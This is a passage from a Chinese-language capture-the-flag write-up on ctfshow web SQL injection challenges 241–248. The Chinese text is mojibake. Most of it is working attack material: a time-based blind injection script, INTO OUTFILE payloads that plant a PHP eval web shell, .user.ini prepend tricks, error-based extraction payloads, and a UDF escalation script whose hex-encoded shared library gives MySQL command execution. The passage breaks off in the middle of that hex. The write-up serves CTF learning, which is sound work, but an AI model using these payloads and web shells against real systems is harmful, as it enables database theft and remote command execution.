where table_schema=database()"</span>        <span class="token comment"># Êü•Ë°®Âêç  id,flag,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='flag'"</span>        <span class="token comment"># Êü•Êï∞ÊçÆ</span>        payload <span class="token operator">=</span> <span class="token string">"select flag from flag"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web242-fileÊ≥®ÂÖ•"><a href="#web242-fileÊ≥®ÂÖ•" class="headerlink" title="web242(fileÊ≥®ÂÖ•)"></a>web242(fileÊ≥®ÂÖ•)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Â§á‰ªΩË°®</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from ctfshow_user into outfile '/var/www/html/dump/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filename</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>Âà©Áî®info outfileÁöÑÊâ©Â±ïÂèÇÊï∞Êù•ÂÅöÈ¢ò</p><ul><li>SELECT ‚Ä¶ INTO OUTFILE ‚Äòfile_name‚Äô<br>    [CHARACTER SET charset_name]<br>    [export_options]</li><li>export_options:<br>[{FIELDS | COLUMNS}<br>    [TERMINATED BY ‚Äòstring‚Äô]&#x2F;&#x2F;ÂàÜÈöîÁ¨¶<br>    [[OPTIONALLY] ENCLOSED BY ‚Äòchar‚Äô]<br>    [ESCAPED BY ‚Äòchar‚Äô]<br>]<br>[LINES<br>    [STARTING BY ‚Äòstring‚Äô]<br>    [TERMINATED BY ‚Äòstring‚Äô]<br>]</li></ul><p><strong>OPTION</strong>ÂèÇÊï∞‰∏∫ÂèØÈÄâÂèÇÊï∞ÈÄâÈ°πÔºåÂÖ∂ÂèØËÉΩÁöÑÂèñÂÄºÊúâÔºö</p><ul><li><p><code>FIELDS TERMINATED BY &#39;Â≠óÁ¨¶‰∏≤&#39;</code>ÔºöËÆæÁΩÆÂ≠óÁ¨¶‰∏≤‰∏∫Â≠óÊÆµ‰πãÈó¥ÁöÑÂàÜÈöîÁ¨¶ÔºåÂèØ‰ª•‰∏∫Âçï‰∏™ÊàñÂ§ö‰∏™Â≠óÁ¨¶„ÄÇÈªòËÆ§ÂÄºÊòØ‚Äú\t‚Äù„ÄÇ</p></li><li><p><code>FIELDS ENCLOSED BY &#39;Â≠óÁ¨¶&#39;</code>ÔºöËÆæÁΩÆÂ≠óÁ¨¶Êù•Êã¨‰ΩèÂ≠óÊÆµÁöÑÂÄºÔºåÂè™ËÉΩ‰∏∫Âçï‰∏™Â≠óÁ¨¶„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ã‰∏ç‰ΩøÁî®‰ªª‰ΩïÁ¨¶Âè∑„ÄÇ</p></li><li><p><code>FIELDS OPTIONALLY ENCLOSED BY &#39;Â≠óÁ¨¶&#39;</code>ÔºöËÆæÁΩÆÂ≠óÁ¨¶Êù•Êã¨‰ΩèCHAR„ÄÅVARCHARÂíåTEXTÁ≠âÂ≠óÁ¨¶ÂûãÂ≠óÊÆµ„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ç‰ΩøÁî®‰ªª‰ΩïÁ¨¶Âè∑„ÄÇ</p></li><li><p><code>FIELDS ESCAPED BY &#39;Â≠óÁ¨¶&#39;</code>ÔºöËÆæÁΩÆËΩ¨‰πâÂ≠óÁ¨¶ÔºåÂè™ËÉΩ‰∏∫Âçï‰∏™Â≠óÁ¨¶„ÄÇÈªòËÆ§ÂÄº‰∏∫‚Äú\‚Äù„ÄÇ</p></li><li><p>*<code>LINES STARTING BY &#39;Â≠óÁ¨¶‰∏≤&#39;</code>*ÔºöËÆæÁΩÆÊØèË°åÊï∞ÊçÆÂºÄÂ§¥ÁöÑÂ≠óÁ¨¶ÔºåÂèØ‰ª•‰∏∫Âçï‰∏™ÊàñÂ§ö‰∏™Â≠óÁ¨¶„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ã‰∏ç‰ΩøÁî®‰ªª‰ΩïÂ≠óÁ¨¶„ÄÇ</p></li><li><p>*<code>LINES TERMINATED BY &#39;Â≠óÁ¨¶‰∏≤&#39;</code>*ÔºöËÆæÁΩÆÊØèË°åÊï∞ÊçÆÁªìÂ∞æÁöÑÂ≠óÁ¨¶ÔºåÂèØ‰ª•‰∏∫Âçï‰∏™ÊàñÂ§ö‰∏™Â≠óÁ¨¶„ÄÇÈªòËÆ§ÂÄºÊòØ‚Äú\n‚Äù„ÄÇ</p></li></ul><p>ÂèØ‰ª•ÂÜôÈ©¨ÁöÑÂèÇÊï∞ÊúâÔºö</p><p><code>FIELDS TERMINATED BY</code>„ÄÅ <code>LINES STARTING BY</code>„ÄÅ <code>LINES TERMINATED BY</code></p><p>Âú®<code>url/api/dump.php</code>‰∏ãÂÜôÈ©¨</p><p>È©¨Âú®url&#x2F;dump&#x2F;1.php</p><pre class="language-php" data-language="php"><code class="language-php">filename=1.php' LINES STARTING BY "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>";#</code></pre><p>ÂëΩ‰ª§Ë°åÂà∞Ê†πÁõÆÂΩïËæìÂÖ•</p><p><code>find / -name &quot;f*&quot; | xargs grep &quot;ctfshow&quot;</code></p><h4 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ËøáÊª§‰∫Üphp</span></code></pre><p>ÂÖà‰∏äiniÔºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;.user.ini&#39; LINES STARTING BY &#39;;&#39; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653a312e6a7067;## auto_prepend_file:1.jpg</code></pre><p>Ê≥®ÊÑè16ËøõÂà∂ÊòØ‰∏∫‰∫Ü0a(Êç¢Ë°å)ÂèëÊå•‰ΩúÁî®ÔºåËÄå<code>starting by ‚Äú;‚ÄùÔºå</code>ÊòØÊÉ≥ËÆ©ÊØèË°åÊï∞ÊçÆÁöÑÂºÄÂ§¥Â≠óÁ¨¶ÈÉΩÊòØÂàÜÂè∑ÔºåÊòØ‰∏∫‰∫ÜËÆ©ÂâçÈù¢ÁöÑÈÇ£‰∏™</p><p><code>select * from ctfshow_user</code>Êü•Âá∫Êù•ÁöÑ‰∏úË•ø‰∏éÂêéÈù¢ÁöÑÂÅö‰∏™‰∫ÜÊñ≠ÔºåÁÑ∂Âêé‰∏äüêé</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">filename&#x3D;1.jpg&#39; LINES TERMINATED BY 0x3c3f3d6576616c28245f504f53545b315d293b3f3e;## &lt;?&#x3D;eval($_POST[1]);?&gt;</code></pre><p>ÔºàÂÅö‰∫ÜÂçäÂ§©‰∏ÄÁõ¥403ÔºåÁúãÂà∞Êúâ‰∏Ä‰ΩçÂ∏àÂÇÖ‰πüÊòØ‰∏ÄÊ†∑Ôºå‰∫éÊòØÊäähttpsÁöÑsÂéªÊéâÂ∞±ÂèØ‰ª•‰∫ÜÔºâ</p><h4 id="web244-errorÊ≥®ÂÖ•-updatexml"><a href="#web244-errorÊ≥®ÂÖ•-updatexml" class="headerlink" title="web244(errorÊ≥®ÂÖ•  updatexml)"></a>web244(errorÊ≥®ÂÖ•  updatexml)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Â§á‰ªΩË°®</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">extractvalue(ÁõÆÊ†áxmlÊñáÊ°£ÔºåxmlË∑ØÂæÑ):ÂØπXMLÊñáÊ°£ËøõË°åÊü•ËØ¢ÁöÑÂáΩÊï∞updatexml(ÁõÆÊ†áxmlÊñáÊ°£ÔºåxmlË∑ØÂæÑÔºåÊõ¥Êñ∞ÁöÑÂÜÖÂÆπ):Êõ¥Êñ∞xmlÊñáÊ°£ÁöÑÂáΩÊï∞ÂÖ∂ÈÉΩÊòØÈíàÂØπxmlË∑ØÂæÑËøõË°åÁöÑÊ≥®ÂÖ•</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39; or updatexml(1,concat(0x7e,database(),0x7e),1)+--+  # 0x7e --&gt; ~?id&#x3D;1&#39; or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+--+?id&#x3D;1&#39; or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+--+</code></pre><p>ÁúãÂà∞‰∫ÜÂ•Ω‰∏úË•ø</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1. floor + rand + group byselect * from user where id&#x3D;1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);select * from user where id&#x3D;1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));2. ExtractValueselect * from user where id&#x3D;1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));3. UpdateXmlselect * from user where id&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1));4. Name_Const(&gt;5.0.12)select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;5. Joinselect * from(select * from mysql.user a join mysql.user b)c;select * from(select * from mysql.user a join mysql.user b using(Host))c;select * from(select * from mysql.user a join mysql.user b using(Host,User))c;6. exp()&#x2F;&#x2F;mysql5.7Ë≤å‰ºº‰∏çËÉΩÁî®select * from user where id&#x3D;1 and Exp(~(select * from (select version())a));7. geometrycollection()&#x2F;&#x2F;mysql5.7Ë≤å‰ºº‰∏çËÉΩÁî®select * from user where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));8. multipoint()&#x2F;&#x2F;mysql5.7Ë≤å‰ºº‰∏çËÉΩÁî®select * from user where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));9. polygon()&#x2F;&#x2F;mysql5.7Ë≤å‰ºº‰∏çËÉΩÁî®select * from user where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));10. multipolygon()&#x2F;&#x2F;mysql5.7Ë≤å‰ºº‰∏çËÉΩÁî®select * from user where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));11. linestring()&#x2F;&#x2F;mysql5.7Ë≤å‰ºº‰∏çËÉΩÁî®select * from user where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));12. multilinestring()&#x2F;&#x2F;mysql5.7Ë≤å‰ºº‰∏çËÉΩÁî®select * from user where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</code></pre><h4 id="web245-extractvalue"><a href="#web245-extractvalue" class="headerlink" title="web245(extractvalue)"></a>web245(extractvalue)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;Êó†ËøáÊª§ËøáÊª§updatexml</code></pre><p>ËøôÈáå‰ΩøÁî®extractvalue</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># Êü•Ë°®Âêç ctfshow_flagsa?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))+--+# Êü•ÂàóÂêç flag1?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39;),0x7e))+--+# getFlag?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),5,15),0x7e))+--+?id&#x3D;1&#39; or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))+--+</code></pre><h4 id="web246-floor"><a href="#web246-floor" class="headerlink" title="web246(floor)"></a>web246(floor)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Êó†ËøáÊª§</span>ËøáÊª§updatexml extractvalue</code></pre><p>ËøôÈáå‰ΩøÁî®floor + rand + group by ‰∏ªË¶ÅÂà©Áî®‰∏ªÈîÆÁöÑÈáçÂ§çÊù•ÂÆûÁé∞Êä•Èîô</p><p><a href="https://www.freebuf.com/column/235496.html">MysqlÊä•ÈîôÊ≥®ÂÖ•‰πãfloor(rand(0)*2)Êä•ÈîôÂéüÁêÜÊé¢Á©∂</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># Êü•Ë°®Âêç ctfshow_flags?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a);--+# Êü•ÂàóÂêç flag2?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flags&#39; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23# getFlag?id&#x3D;1&#39; and (select 1 from (select count(*),concat((select flag21 from ctfshow_flags1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</code></pre><h4 id="web247-ÂèåÊü•ËØ¢ÈîôËØØÊ≥®ÂÖ•„ÄÅÊä•ÈîôÊ≥®ÂÖ•"><a href="#web247-ÂèåÊü•ËØ¢ÈîôËØØÊ≥®ÂÖ•„ÄÅÊä•ÈîôÊ≥®ÂÖ•" class="headerlink" title="web247(ÂèåÊü•ËØ¢ÈîôËØØÊ≥®ÂÖ•„ÄÅÊä•ÈîôÊ≥®ÂÖ•)"></a>web247(ÂèåÊü•ËØ¢ÈîôËØØÊ≥®ÂÖ•„ÄÅÊä•ÈîôÊ≥®ÂÖ•)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Êó†ËøáÊª§</span>ËøáÊª§updatexml extractvalue floor</code></pre><p><code>floor()ÔºöÂêë‰∏ãÂèñÊï¥</code><br><code>ceil()ÔºöÂêë‰∏äÂèñÊï¥</code><br><code>round()ÔºöÂõõËàç‰∫îÂÖ•</code></p><p>floorÊõøÊç¢ÊàêÂÖ∂‰ªñÂèñÊï¥ÂáΩÊï∞Âç≥ÂèØ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># Êü•Ë°®Âêç ctfshow_flagsa1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# Êü•ÂàóÂêç flag?1&#39; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagsa&#39; limit 1,1),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23# getFlag1&#39; and (select 1 from (select count(*),concat((select &#96;flag?&#96; from ctfshow_flagsa),ceil(rand(0)*2))x from information_schema.tables group by x)a);%23</code></pre><h4 id="web248-udfÊ≥®ÂÖ•"><a href="#web248-udfÊ≥®ÂÖ•" class="headerlink" title="web248(udfÊ≥®ÂÖ•)"></a>web248(udfÊ≥®ÂÖ•)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></code></pre><p>mysqlÁöÑUAFÊ≥®ÂÖ•,ÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØÊäädllÊñá‰ª∂ÂÜôÂà∞ÁõÆÊ†áÊú∫Â≠êÁöÑpluginÁõÆÂΩïÔºåËøô‰∏™ÁõÆÂΩïÊòØÂèØ‰ª•ÈÄöËøáselect @@plugin_dirÊù•ÂæóÂà∞ÁöÑ„ÄÇÊ≠§Â§ñÂ∞±ÊòØËøôÈ¢òÂèØ‰ª•Â†ÜÂè†Ê≥®ÂÖ•ÔºåÊàë‰∏ÄÂºÄÂßãÊ≤°ÊÉ≥Âà∞ÂèØ‰ª•Â†ÜÂè†Ôºå‰ª•‰∏∫ÊòØÂ∏ÉÂ∞îÔºåÂÖ∂ÂÆûËøòÊòØÊ≤°ÁêÜËß£Ëøô‰∏™UAFÊ≥®ÂÖ•ÔºåÊúÄÂêéÁöÑÂØºÂÖ•ÂáΩÊï∞ËøôÈáåÔºö</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;api&#x2F;?id&#x3D;1&#39;; select @@plugin_dir; -- -Êü•Âá∫MysqlÊèí‰ª∂Ë∑ØÂæÑÔºö&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#x2F;api&#x2F;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+ÂºïÂÖ•udf.soÊñá‰ª∂‰ªéËÄåÂàõÂª∫ÂáΩÊï∞sys_eval</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;; &#x2F;&#x2F;ÂØºÂÖ•udfÂáΩÊï∞</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsbase_url <span class="token operator">=</span> <span class="token string">"https://49e6bca5-e443-47a8-9a15-8619fb62730f.challenge.ctf.show/api/"</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">]</span>udf <span class="token operator">=</span> <span class="token string">"7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E